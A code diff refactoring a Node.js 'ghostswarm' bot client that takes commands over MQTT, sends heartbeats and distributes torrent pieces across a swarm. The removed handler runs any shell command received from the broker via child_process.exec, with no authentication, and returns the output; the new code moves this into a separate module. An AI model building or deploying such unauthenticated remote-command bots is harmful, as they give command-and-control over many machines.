@@ -1,40 +1,21 @@
-const mqtt = require('mqtt');
 const { exec } = require('child_process');
 
 const MQTT_BROKER = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';
 
 const fs = require("fs");
 const path = require("path");
-const { download } = require("./download.js"); // Ensure you have this package installed
+const { download } = require("./torrent/download"); // Ensure you have this package installed
+const config = require("./config");
+const { startMQTT } = require("./mqtt/client");
+const { startHeartbeat } = require("./heartbeat/heartbeat");
+const { executeShellCommand } = require("./commands/commands");
 
-let botId;
-try {
-   botId = fs.readFileSync("/host_hostname", "utf8").trim();
-} catch {
-   botId = require("os").hostname(); // fallback
-}
+const botId = config.mqtt.botId;
 
 console.log(`🤖 [${botId}] connecting to MQTT broker at ${MQTT_BROKER}`);
-const mqttClient = mqtt.connect(MQTT_BROKER);
-
-mqttClient.on('connect', () => {
-   console.log(`🤖 [${botId}] connected to MQTT`);
-   const topic = `ghostswarm/${botId}/command`;
-   mqttClient.subscribe(topic, { qos: 1 }, (err) => {
-      if (err) {
-         console.error(`❌ [${botId}] failed to subscribe:`, err);
-      } else {
-         console.log(`📡 [${botId}] subscribed to ${topic}`);
-      }
-   });
-   mqttClient.subscribe(`ghostswarm/download/#`);
-   mqttClient.subscribe(`ghostswarm/torrent/have/#`);
-   mqttClient.subscribe(`ghostswarm/${botId}/download/#`, { qos: 1 }, (err) => {
-      checkForTorrents();
-   });
-
-
-});
+const mqttClient = startMQTT()
+startHeartbeat(mqttClient);
+checkForTorrents();
 
 mqttClient.on('message', (topic, message) => {
    console.log("message received on topic:", topic);
@@ -43,30 +24,7 @@ mqttClient.on('message', (topic, message) => {
       if (topic == `ghostswarm/${botId}/command`) {
          const payload = JSON.parse(message.toString());
          console.log(`📥 [${botId}] received:`, payload);
-
-         const statusTopic = `ghostswarm/${botId}/status`;
-
-         // Handle different message types
-         if (payload.type === 'shell' && payload.cmd) {
-            // Execute shell command
-            exec(payload.cmd, (err, stdout, stderr) => {
-               mqttClient.publish(statusTopic, JSON.stringify({
-                  requestId: payload.requestId,
-                  output: err ? stderr || 'Command failed' : stdout.trim(),
-                  status: err ? 'error' : 'ok',
-                  time: Date.now()
-               }));
-               console.log(`📤 [${botId}] shell command executed and responded`);
-            });
-         } else {
-            // General echo response for non-shell commands
-            mqttClient.publish(statusTopic, JSON.stringify({
-               received: payload,
-               status: "ok",
-               time: Date.now()
-            }));
-            console.log(`📤 [${botId}] responded to status`);
-         }
+         executeShellCommand(payload, mqttClient);
 
       } else if (topic.startsWith('ghostswarm/download/')) {
          const infoHash = topic.split('/')[2];
@@ -104,7 +62,7 @@ mqttClient.on('message', (topic, message) => {
 });
 
 function updateSwarmMap(infoHash, pieceIndex, who) {
-   const swarmFile = path.join('/swarm', `${infoHash}.json`);
+   const swarmFile = config.PATHS.SWARM_DIR + `/${infoHash}.json`;
    fs.mkdirSync(path.dirname(swarmFile), { recursive: true });
 
    let map = {};
@@ -122,8 +80,9 @@ function updateSwarmMap(infoHash, pieceIndex, who) {
 
 function handleTorrentDownload(infoHash, payload) {
    // save payload to file 
-   const torrentPath = `torrents/${infoHash}.json`;
-   const outDir = path.join('/pieces', infoHash);
+   const torrentPath = config.PATHS.TORRENTS_DIR + `/${infoHash}${config.PATHS.TORRENT_EXTENSION}`;
+   const outDir = config.PATHS.PIECES_DIR + `/${infoHash}`;
+   const uploadsDir = config.PATHS.UPLOADS_DIR + `/${payload.name}`;
    if (fs.existsSync(outDir)) {
       console.log(`📂 [${botId}] torrent ${infoHash} already exists in ${outDir}`);
       return;
@@ -132,8 +91,8 @@ function handleTorrentDownload(infoHash, payload) {
       console.log(`📂 [${botId}] torrent ${infoHash} already exists in ${torrentPath}`);
       return;
    }
-   if (fs.existsSync('/uploads/' + payload.name)) {
-      console.log(`📂 [${botId}] torrent ${infoHash} already exists in /uploads/${payload.name}`)
+   if (fs.existsSync(uploadsDir)) {
+      console.log(`📂 [${botId}] torrent ${infoHash} already exists in ${uploadsDir}`);
       return;
    }
 
@@ -176,14 +135,3 @@ function checkForTorrents() {
 
 
 
-function heartbeat() {
-   const statusTopic = `ghostswarm/status/${botId}`;
-   mqttClient.publish(statusTopic, JSON.stringify({
-      status: "alive",
-      time: Date.now()
-   }));
-   // console.log(`❤️ [${botId}] heartbeat sent`);
-}
-
-heartbeat(); // send initial heartbeat
-setInterval(heartbeat, 15000); // send heartbeat every 15 seconds
